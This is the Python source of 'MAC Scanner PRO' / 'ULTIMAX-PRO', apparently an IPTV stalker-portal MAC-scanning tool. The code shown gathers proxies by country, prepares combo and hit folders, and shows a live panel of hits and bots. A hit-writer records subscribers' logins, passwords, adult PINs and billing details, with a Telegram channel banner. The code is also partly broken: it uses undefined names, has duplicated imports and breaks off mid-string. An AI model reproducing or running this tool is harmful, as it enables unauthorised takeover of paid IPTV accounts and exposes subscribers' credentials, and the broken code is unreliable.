requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM:DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
import requests, json, unicodedata, os, sys, re
from urllib.parse import urlsplit
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT"
os.system('cls' if os.name == 'nt' else 'clear')
from colorama import Fore, Back, Style
from playsound import playsound
try:
	from playsound import playsound#import requests
except:
	print("requests module is not installed \n loading requests module \n")
	#pip.main(['install', 'playsound'])
#pip.main(['install','pyshorteners'])
#import pyshorteners
#type_tiny = pyshorteners.Shortener()
try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass

my_os = platform.system()
if (my_os == "Windows"):
    rootDir = "./"
    my_os="Wɪɴᴅᴏᴡs"
else:
    rootDir = "/sdcard/"
    my_os="Aɴᴅʀᴏɪᴅ"
my_cpu = platform.machine()
my_py = platform.python_implementation()
print("\33[1m\33[1;32m        OS in my system : ", my_os+"\33[0m")
	
if not os.path.exists(rootDir+'Hits'):
    os.makedirs(rootDir+'Hits')
    
if not os.path.exists(rootDir+'combo'):
    os.makedirs(rootDir+'combo')

if not os.path.exists(rootDir+'Proxy'):
    os.makedirs(rootDir+'Proxy')
   
if not os.path.exists('/sdcard/sounds'):
    os.makedirs('/sdcard/sounds')
if not os.path.exists('./sounds'):
    os.makedirs('./sounds')
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning

logging.captureWarnings(True)
os.system('cls' if os.name == 'nt' else 'clear')
import requests, json, unicodedata, os, sys, re
from urllib.parse import urlsplit
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT"

if not os.path.exists(rootDir+'proxy'):
    os.makedirs(rootDir+'proxy')
    
import os 

Green="\033[1;33m"
Blue="  \33[1m\33[7;49;94m"
Grey="\033[1;30m"
Reset="\033[0m"
Red="\033[1;31m"
Purple="\033[0;35m"
c = ""
d = -1
chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
def chooseit():
	print("""
\33[1m\033[48;5;003m\033[38;5;233m              MAC Scanner PRO             
\33[38;5;227m\33[48;5;023m------------------------------------------
    ___    ____  _________       _________
   /   |  / __ \/ ____/   |     / ____<  /
  / /| | / /_/ / __/ / /| |    /___ \ / / 
 / ___ |/ _, _/ /___/ ___ |   ____/ // /  
/_/  |_/_/ |_/_____/_/  |_|  /_____//_/   
------------------------------------------\33[97m
\033[48;5;003m\033[38;5;233mCREW PROJECT               \033[38;5;088mMod by Gabri   \33[0m
""")

	b = '''  \33[1m\33[7;49;94m[ 1 ]\33[0m\033[38;5;031m  ⮕   \033[38;5;027mALL Countries
  \33[1m\33[7;49;94m[ 2 ]\33[0m\033[38;5;030m  ⮕  🇺🇸  \033[38;5;026mUSA \33[0m
  \33[1m\33[7;49;94m[ 3 ]\33[0m\033[38;5;029m  ⮕  🇷🇸  \033[38;5;025mRussia    \33[0m
  \33[1m\33[7;49;94m[ 4 ]\33[0m\033[38;5;028m  ⮕  🇺🇦  \033[38;5;024mUkraine    \33[0m
  \33[1m\33[7;49;94m[ 5 ]\33[0m\033[38;5;190m  ⮕  🇮🇳  \033[38;5;023mIndia    \33[0m
  \33[1m\33[7;49;94m[ 6 ]\33[0m\033[38;5;154m  ⮕  🇮🇹  \033[38;5;022mItaly    \33[0m
  \33[1m\33[7;49;94m[ 7 ]\33[0m\033[38;5;155m  ⮕  🇨🇦  \033[38;5;058mCanada    \33[0m
  \33[1m\33[7;49;94m[ 8 ]\33[0m\033[38;5;156m  ⮕  🇫🇷  \033[38;5;094mFrance    \33[0m
  \33[1m\33[7;49;94m[ 9 ]\33[0m\033[38;5;157m  ⮕  🇹🇭  \033[38;5;131mThailand    \33[0m
  \33[1m\33[7;49;94m[ 10 ]\33[0m\033[38;5;158m  ⮕  🇵🇱  \033[38;5;130mPoland     \33[0m
  \33[1m\33[7;49;94m[ 11 ]\33[0m\033[38;5;159m  ⮕  🇳🇱  \033[38;5;166mNetherlands   \33[0m
  \33[1m\33[7;49;94m[ 12 ]\33[0m\033[38;5;195m  ⮕  🇲🇽  \033[38;5;202mMexico    \33[0m
  \33[1m\33[7;49;94m[ 13 ]\33[0m\033[38;5;194m  ⮕  🇰🇿  \033[38;5;203mKazakhstan    \33[0m
  \33[1m\33[7;49;94m[ 14 ]\33[0m\033[38;5;193m  ⮕  🇮🇷  \033[38;5;204mIran    \33[0m
  \33[1m\33[7;49;94m[ 15 ]\33[0m\033[38;5;192m  ⮕  🇪🇬  \033[38;5;205mEgypt     \33[0m
  \33[1m\33[7;49;94m[ 16 ]\33[0m\033[38;5;191m  ⮕  🇭🇰  \033[38;5;206mHong Kong    \33[0m
  \33[1m\33[7;49;94m[ 17 ]\33[0m\033[38;5;190m  ⮕  🇩🇪  \033[38;5;207mGermany     \33[0m
  \33[1m\33[7;49;94m[ 18 ]\33[0m\033[38;5;154m  ⮕  🇻🇳  \033[38;5;171mVietman     \33[0m
  \33[1m\33[7;49;94m[ 19 ]\33[0m\033[38;5;118m  ⮕  🇭🇺  \033[38;5;135mHungary    \33[0m
  \33[1m\33[7;49;94m[ 20 ]\33[0m\033[38;5;082m  ⮕  🇧🇷  \033[38;5;099mBrazil       \33[0m
  \33[1m\33[7;49;94m[ 21 ]\33[0m\033[38;5;083m  ⮕  🇯🇵  \033[38;5;063mJapan        \33[0m
  \33[1m\33[7;49;94m[ 22 ]\33[0m\033[38;5;084m  ⮕  🇰🇭  \033[38;5;062mCambodia    \33[0m
  \33[1m\33[7;49;94m[ 23 ]\33[0m\033[38;5;085m  ⮕  🇨🇳  \033[38;5;061mChina      \33[0m
  \33[1m\33[7;49;94m[ 24 ]\33[0m\033[38;5;086m  ⮕  🇨🇱  \033[38;5;060mChile      \33[0m
  \33[1m\33[7;49;94m[ 25 ]\33[0m\033[38;5;122m  ⮕  \033[38;5;198mSSL \33[1m\033 \033[38;5;246m PROXY      \33[0m
  \33[1m\33[7;49;94m[ 26 ]\33[0m\033[38;5;158m  ⮕  \033[38;5;045mSOCKS4 \33[1m\033 \033[38;5;246m PROXY     \33[0m
  \33[1m\33[7;49;94m[ 27 ]\33[0m\033[38;5;194m  ⮕  \033[38;5;204mSOCKS5 \33[1m\033 \033[38;5;246m PROXY       \33[0m
  \33[1m\33[7;49;94m[ 28 ]\33[0m\033[38;5;158m  ⮕  \033[38;5;045mHTTP \33[1m\033 \033[38;5;246m PROXY         \33[0m
  \33[1m\33[7;49;94m[ 29 ]\33[0m\033[38;5;194m  ⮕  \033[38;5;198mHTTPS \33[1m\033 \033[38;5;246m PROXY        \33[0m
  \33[1m\33[7;49;94m[ 30 ]\33[0m\033[38;5;230m  ⮕  \33[1m\033[38;5;196mEXIT            \033[1;36mChoose : '''
	print(b,end = "")
	global c
	c = int(input())
	global d
	d = c
	gupt = str(c)
	guyt = len(gupt)
	if guyt >= int(2):
		if guyt ==1:
			d=int(c)
	return d
chooseit()
print('\n\n\033[93m Please wait, the proxies are DOWNLOADING!')
while d == "" :
	print('\n')
	dhechu = ('\033[93m Please enter a valid option and it must be a number!\nPRESS ANY KEY TO RESET)')
	print(dhechu,end = '')
	well = input()
	
	os.system("cls" if os.name == "nt" else "clear")
	banner()
	chooseit()
	continue
headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}

if d == int(1):
	url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=750&country=all"
	htp = requests.get(url,headers = headers)
	print('\n')
	r = htp.text
	e = open(rootDir+'Proxy/HTTPfree.txt', 'w+')
	vu = e.write(r)
	e.close()
if d == int(2):
	url2 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=750&country=US"
	htp2 = requests.get(url2,headers = headers)
	print('\n')
	r2= htp2.text
	e2 = open(rootDir+'Proxy/USA.txt', 'w+')
	vu2 = e2.write(r2)
	e2.close()
if d == int(3):
    url3 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=RU"
    htp3 = requests.get(url3,headers = headers)
    r3 = htp3.text
    e3 = open(rootDir+'Proxy/RUSSIA.txt', 'w+')
    vu3 = e3.write(r3)
    e3.close()
if d == int(4):
    url4 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=UA"
    htp4 = requests.get(url4,headers = headers)
    r4 = htp4.text
    e4 = open(rootDir+'Proxy/UKRAINA.txt', 'w+')
    vu4 = e4.write(r4)
    e4.close()
if d == int(5):
    url5 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=IN"
    htp5 = requests.get(url5,headers = headers)
    r5 = htp5.text
    e5 = open(rootDir+'Proxy/INDIA.txt', 'w+')
    vu5 = e5.write(r5)
    e5.close()
if d == int(6):
    url6 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=IT"
    htp6 = requests.get(url6,headers = headers)
    r6 = htp6.text
    e6 = open(rootDir+'Proxy/ITALY.txt', 'w+')
    vu6 = e6.write(r6)
    e6.close()
if d == int(7):
    url7 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=CA"
    htp7 = requests.get(url7,headers = headers)
    r7 = htp7.text
    e7 = open(rootDir+'Proxy/CANADA.txt', 'w+')
    vu7 = e7.write(r7)
    e7.close()
if d == int(8):
    url8 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=FR"
    htp8 = requests.get(url8,headers = headers)
    r8 = htp8.text
    e8 = open(rootDir+'Proxy/FRANCE.txt', 'w+')
    vu8 = e8.write(r8)
    e8.close()
if d == int(9):
    url9 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=TH"
    htp9 = requests.get(url9,headers = headers)
    r9 = htp9.text
    e9 = open(rootDir+'Proxy/THAILAND.txt', 'w+')
    vu9 = e9.write(r9)
    e9.close()
if d == int(10):
    url10 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1000&country=PL"
    htp10 = requests.get(url10,headers = headers)
    r10 = htp10.text
    e10 = open(rootDir+'Proxy/POLAND.txt', 'w+')
    vu10 = e10.write(r10)
    e10.close()
if d == int(11):
    url11 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=2100&country=NL"
    htp11 = requests.get(url10,headers = headers)
    r11 = htp11.text
    e11 = open(rootDir+'Proxy/NEDERLAND.txt', 'w+')
    vu11 = e11.write(r11)
    e11.close()
if d == int(12):
    url12 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=MX"
    htp12 = requests.get(url12,headers = headers)
    r12 = htp12.text
    e12 = open(rootDir+'Proxy/MEXICO.txt', 'w+')
    vu12 = e12.write(r12)
    e12.close()
if d == int(13):
    url13 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=KZ"
    htp13 = requests.get(url13,headers = headers)
    r13 = htp13.text
    e13 = open(rootDir+'Proxy/KAZAKHSTAN.txt', 'w+')
    vu13 = e13.write(r13)
    e13.close()
if d == int(14):
    url14 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=IR"
    htp14 = requests.get(url14,headers = headers)
    r14 = htp14.text
    e14 = open(rootDir+'Proxy/IRAN.txt', 'w+')
    vu14 = e14.write(r14)
    e14.close()
if d == int(15):
    url15 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=EG"
    htp15 = requests.get(url15,headers = headers)
    r15 = htp15.text
    e15 = open(rootDir+'Proxy/EGYPT.txt', 'w+')
    vu15 = e15.write(r15)
    e15.close()
if d == int(16):
    url16 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=2250&country=HK"
    htp16 = requests.get(url16,headers = headers)
    r16 = htp16.text
    e16 = open(rootDir+'Proxy/HONGKONG.txt', 'w+')
    vu16 = e16.write(r16)
    e16.close()
if d == int(17):
    url17 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=DE"
    htp17 = requests.get(url17,headers = headers)
    r17 = htp17.text
    e17 = open(rootDir+'Proxy/GERMANY.txt', 'w+')
    vu17 = e17.write(r17)
    e17.close()
if d == int(18):
    url18 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=VN"
    htp18 = requests.get(url18,headers = headers)
    r18 = htp18.text
    e18 = open(rootDir+'Proxy/VIETHNAM.txt', 'w+')
    vu18 = e18.write(r18)
    e18.close()
if d == int(19):
    url19 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=HU"
    htp19 = requests.get(url19,headers = headers)
    r19 = htp19.text
    e19 = open(rootDir+'Proxy/HUNGARY.txt', 'w+')
    vu19 = e19.write(r19)
    e19.close()
if d == int(20):
    url20 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=BR"
    htp20 = requests.get(url20,headers = headers)
    r20 = htp20.text
    e20 = open(rootDir+'Proxy/BRAZIL.txt', 'w+')
    vu20 = e20.write(r20)
    e20.close()
if d == int(21):
    url21 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=JP"
    htp21 = requests.get(url21,headers = headers)
    r21 = htp21.text
    e21 = open(rootDir+'Proxy/JAPAN.txt', 'w+')
    vu21 = e21.write(r21)
    e21.close()
if d == int(22):
    url22 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1500&country=KH"
    htp22 = requests.get(url22,headers = headers)
    r22 = htp22.text
    e22 = open(rootDir+'Proxy/CAMBODIA.txt', 'w+')
    vu22 = e22.write(r22)
    e22.close()
if d == int(23):
    url23 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=1250&country=CN"
    htp23 = requests.get(url23,headers = headers)
    r23 = htp23.text
    e23 = open(rootDir+'Proxy/CHINA.txt', 'w+')
    vu23 = e23.write(r23)
    e23.close()
if d == int(24):
    url24 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=2250&country=CL"
    htp24 = requests.get(url24,headers = headers)
    r24 = htp24.text
    e24 = open(rootDir+'Proxy/CHILE.txt', 'w+')
    vu24 = e24.write(r24)
    e24.close()
if d == int(25):
    url25 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=500&country=all&ssl=all"
    htp25 = requests.get(url25,headers = headers)
    r25 = htp25.text
    e25 = open(rootDir+'Proxy/SSL-Proxy.txt', 'w+')
    vu25 = e25.write(r25)
    e25.close()
if d == int(26):
    url26 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=750&country=all"
    htp26 = requests.get(url26,headers = headers)
    r26 = htp26.text
    e26 = open(rootDir+'Proxy/SOCKS-4.txt', 'w+')
    vu26 = e26.write(r26)
    e26.close()
if d == int(27):
    url27 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=750&country=all"
    htp27 = requests.get(url27,headers = headers)
    r27 = htp27.text
    e27 = open(rootDir+'Proxy/SOCKS-5.txt', 'w+')
    vu27 = e27.write(r27)
    e27.close()
if d == int(29):
    url28 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=750&country=all"
    htp28 = requests.get(url28,headers = headers)
    r28 = htp28.text
    e28 = open(rootDir+'Proxy/HTTP.txt', 'w+')
    vu28 = e28.write(r28)
    e28.close()
if d == int(29):
    url29 = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=750&country=all"
    htp29 = requests.get(url29,headers = headers)
    r29 = htp29.text
    e29 = open(rootDir+'Proxy/HTTPS.txt', 'w+')
    vu29 = e29.write(r29)
    e29.close()
if d == int(30):
	print('\n\n\n\033[38;5;202m\33[1m       Gᴏᴏᴅ ʙʏᴇ ᴀɴᴅ ᴡᴇʟᴄᴏᴍᴇ ᴀɴʏᴛɪᴍᴇ.\33[0m')
	
	exit
os.system("cls" if os.name == "nt" else "clear")
import sys, os
NOME = 'ULTIMAX-PRO√¹'
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f''']2;{NOME}''')
import os,pip
import datetime,os
import socket,hashlib
import json,random,sys, time,re
import os,pip
import platform
from pystyle import System
from playsound import playsound

rootDir=""
my_os = platform.system()
if (my_os == "Windows"):
    rootDir = "." 
    my_os="Wɪɴᴅᴏᴡs"
else:
    rootDir = "/sdcard"
    my_os="Aɴᴅʀᴏɪᴅ"
my_cpu = platform.machine()
my_py = platform.python_implementation()
print("\33[38;5;190m ᴏs ɪɴ ᴍʏ sʏsᴛᴇᴍ :\33[38;5;226m ", my_os+"\33[0m")


try:
        import androidhelper as sl4a
        ad = sl4a.Android()
except:pass
import subprocess
try:
        import threading
except:pass
import pathlib

try:
        import requests
except:
        print("requests modul not found \n requests modul installing now... \n")
        pip.main(['install', 'requests'])
import requests
try:
        import sock
except:
        print("sock modul not found \n sock modul installing now \n")
        pip.main(['install', 'requests[socks]'] )
        pip.main(['install', 'sock'] )
        pip.main(['install', 'socks'] )
        pip.main(['install', 'PySocks'] )
import sock
maca=0
macv=0
  
nickn=""
nickn=""
white=("""\033[1;37;40m\n""") 
if nickn=="":
	nickn=" "

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
import pathlib
os.system("cls" if os.name == "nt" else "clear")
try:
	import threading
except:pass
import pathlib

try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
import requests
try:
	import sock
except:
	print("sock modulu yüklü değil \n sock modulü yükleniyor \n")
	pip.main(['install', 'requests[socks]'] )
	pip.main(['install', 'sock'] )
	pip.main(['install', 'socks'] )
	pip.main(['install', 'PySocks'] )
import sock

if not os.path.exists('sounds'):
    os.makedirs('sounds')

os.system("cls" if os.name == "nt" else "clear")
getmac=""
oto=0
tur=0
Seri=""
csay=0

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()
global kate
kate=""
global envivo
envivo=0
global peliculas
peliculas=0
global series
series=0
global juanka
juanka=""
global current_time
global hora_inicio
global hora_ini
time_= time.localtime()
current_time = time.strftime("%d %m %Y - %H:%M:%S", time_)
hora_ini = time.strftime("%d %m %Y/%H:%M:%S", time_)

say1=0
say2=0
say=0
yanpanel="hata" 
imzayan="" 
bul=0
hitc=0
prox=0
cpm=0

def a(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
a("""            
\33[1m\033[48;5;003m\033[38;5;233m              MAC Scanner PRO             
\33[38;5;227m\33[48;5;023m------------------------------------------
    ___    ____  _________       _________
   /   |  / __ \/ ____/   |     / ____<  /
  / /| | / /_/ / __/ / /| |    /___ \ / / 
 / ___ |/ _, _/ /___/ ___ |   ____/ // /  
/_/  |_/_/ |_/_____/_/  |_|  /_____//_/   
------------------------------------------\33[97m
\033[48;5;003m\033[38;5;233mCREW PROJECT               \033[38;5;088mMod by Gabri   \33[0m
""") 

time.sleep(1)

bekleme=1

cpm=0
cpmx=0
hitr=0
m3uon=0
m3uvpn=0
macon=0
macvpn=0
macexp = 0
respons=""
color=""

def echok(mac,bot,total,hitc,oran):
	global cpm,hitr,m3uon,m3uvpn,m3uonxmacon,macvpn,macvpn,macon,bib,tokenr,proxies,respons,color,macexp	

	bib=0
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	if str(cpmx)=="0":
			cpm=cpm
	else:
			cpm=cpmx					
	# Aqui as cores para o texto ficar mudando de cor
	#colors = [90, 91, 92, 93, 94, 95, 96, 97]
	colors = [Preto, Cinza, Cinza_Claro, Vermelho, Verde, Amarelo, Azul, Roxo, Ciano, Branco, Verde_Claro, Amarelo_Claro, Texto_Branco, Laranja, Tom_de_Verde, Marrom, Tom_de_Roxo, COR0, COR1, COR2, COR3, COR4, COR5, COR6, COR7, COR8, COR9, COR10, COR11, COR12, COR13, COR14, COR15, COR16, COR17, COR18, COR19, COR20, COR21, COR22, COR23, COR24, COR25, COR26, COR27, COR28, COR29, COR30, COR31, COR32, COR33, COR34, COR35, COR36, COR37, COR38, COR39, COR40, COR41, COR42, COR43, COR44, COR45, COR46, COR47, COR48, COR49, COR50, COR51, COR52, COR53, COR54, COR55, COR56, COR57, COR58, COR59, COR60, COR61, COR62, COR63, COR64, COR65, COR66, COR67, COR68, COR69, COR70, COR71, COR72, COR73, COR74, COR75, COR76, COR77, COR78, COR79, COR80, COR81, COR82, COR83, COR84, COR85, COR86, COR87, COR88, COR89, COR90, COR91, COR92, COR93, COR94, COR95, COR96, COR97, COR98, COR99, COR100, COR101, COR102, COR103, COR104, COR105, COR106, COR107, COR108, COR109, COR110, COR111, COR112, COR113, COR114, COR115, COR116, COR117, COR118, COR119, COR120, COR121, COR122, COR123, COR124, COR125, COR126, COR127, COR128, COR129, COR130, COR131, COR132, COR133, COR134, COR135, COR166, COR167, COR168, COR169, COR170, COR171, COR172, COR173, COR174, COR175, COR176, COR177, COR178, COR179, COR180, COR181, COR182, COR183, COR184, COR185, COR186, COR187, COR188, COR189, COR190, COR191, COR192, COR193, COR194, COR195, COR196, COR197, COR198, COR199, COR200, COR201, COR202, COR203, COR204, COR205, COR206, COR207, COR208, COR209, COR210, COR211, COR212, COR213, COR214, COR215, COR216, COR217, COR218, COR219, COR220, COR221, COR222, COR223, COR224, COR225, COR226, COR227, COR228, COR229, COR230, COR231, COR232, COR233, COR234, COR235, COR236, COR237, COR238, COR239, COR240, COR241, COR242, COR243, COR244, COR245, COR246, COR247, COR248, COR249, COR250, COR251, COR252, COR253, COR254, COR255]
	# Escolha a cor com base no tempo atual
	color_code = colors[int(time.time()) % len(colors)]
	text =" ULTIMAX-PRO√¹ PROXY"					
	echo=("""     

\033[1;32m┌\33[1m\033[1;33m\33[48;5;022m  SCANNER  MAC PROFESSIONAL     PROXY  \033[0m        
\033[1;32m│╭─\33[38;5;227m\33[48;5;023m\33[1m MacFinderPro Crew Project  by GABRi \33[0m
\033[1;32m│╭─ \033["""+str(color_code)+""" """+text+"""      \33[0m
\033[1;32m│├ \033[1;91mULTIMAX-PRO√¹            \33[0m         
\033[1;32m│├ \033[1;91mSystem """+my_os+"""      \33[0m
\033[1;32m│├ \033[1;92mScanner """+my_py+"""      \33[0m
\033[1;32m│├ \033[1;93mCPU """+str(my_cpu)+"""     \33[0m
\033[1;32m│├ \033[1;91mSCAN BY  """+str(nickn)+"""   \33[0m
\033[1;32m│├ \033[1;31mSTART """+str(hora_ini)+"""  \33[0m 
\033[1;32m│├ \033[1;31mTEMPO \33[1;32m"""+str(time.strftime('%H:%M:%S'))+"""  \33[0m            
\033[1;32m│├ \033[1;92mPORTAL \33[1;93m"""+str(panel)+"""   \33[0m
\033[1;32m│├ \033[0;91mPORTAL TIPO \33[1;31m"""+str(uzmanm)+"""   \33[0m
\033[1;32m│├ \033[1;92mMAC"""+tokenr+str(mac)+"""  \33[0m   
\033[1;32m│├ \033[1;94mTOTAL \33[36m"""+str(combouz)+""" \33[0m/\33[1;93m """+str(total)+""" \33[1;31m"""+str(oran)+"""% \33[0m  
\033[1;32m│├ \033[1;93mCPM \33[1;33m"""+str(cpm)+""" \33[0m \33[1mBOTS  \33[1;32m"""  +str(bot)+""" \33[0m
\033[1;32m│├ \033[1;93mHITS \033[0;91m"""+str(hitr)+"""""" +str(hitc)+""" \33[0m \33[91mMISSED≽ \033[0;91m"""+str(macexp)+"""   \33[0m   
\033[1;32m│├ \033[1;93mCOMBO \33[36m"""+str(combodosya)+""" \33[0m  
\033[1;32m│├ \033[1;91mPROXY  \33[1;31m"""+str(proxysay)+""" \33[0m """+statusproxy+"""  \33[0m
\033[1;32m│├ \033[1;92mM3U \33[1;32m"""+str(m3uon)+"""\33[0m/   \33[1;31m """+str(m3uvpn)+"""  \33[0m   
\033[1;32m│├ \033[1;92mMAC  \33[1;32m"""+str(macon)+"""\33[0m/   \33[1;31m """+str(macvpn)+"""  \33[0m
\033[1;32m│╰─ \033[1;92mSTATUS \33[0m\33[1;36m Http |"""+color+tokenr+str(respons)+""" \33[0m
\033[1;32m│╰─\33[48;5;227m\33[38;5;023m\33[1m  MAC  SCANNER  PRO  CREW   PROJECT  \33[0m
\033[1;32m└\33[1m\33[48;5;010m\33[38;5;232m  AREA      51     CREW     PROJECT    \033[0m

\033[33;5;229m      AREA51   PREMIUM PYTHON   AREA51   \33[0m""")  
      
	
	print(echo)
	#time.sleep(1)
	cpm=time.time()
	
			
bot=0
hit=0
hitr="\33[1;33m"
tokenr="\33[0m"
oran=""
def bekle(bib,vr):
	i=bib
			
		
kanalkata="2"
stalker_portal="PRL"
def hityaz(mac,trh,real,m3ulink,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,country_name,scountry,kanalsayisi,filmsayisi,dizisayisi,ip):
	global hitr,hitsay
	panell=panel
	reall=real
	if 'PRL' == 'PRL':#try:
		simza=""
		if uzmanm=="stalker_portal/server/load.php":
			panell=str(panel)+'/stalker_portal'
			reall=real.replace('/c/','/stalker_portal/c/')
			simza="""
╠☞ https://t.me/malayalamIPTV9
╠☞ BillingDate★≽  """+str(bill)+"""
╠☞ ExpireDate★≽  """+expire_billing_date+"""
╠☞ Login★≽  """+login+"""
╠☞ Password★≽  """+password+"""
╠☞ FullName★≽  """+fname+"""
╠☞ AdultPassword★≽  """+parent_password+"""
╠☞ TariffID★≽  """+tariff_plan_id+"""
╠☞ TariffPlan★≽  """+tariff_plan+"""
╠☞ MaxOnline★≽  """+max_online+"""
╠☞ StbType★≽  """+stb_type+"""
╠☞ Country★≽  """+country+"""
╠☞ SettingsPassword☞  """+settings_password+"""
╠☞ Comment☞★≽  """+comment+"""  
╚════════☰ ✬https://t.me/malayalamIPTV9──"""
		imza="""	
		

╔═▼─https://t.me/malayalamIPTV9▼═╗
╠☞ 🆂🄲🄰🄽✩🆂🅈🆂🅃🅴🅼
╠☞ System☞  """+my_os+"""       
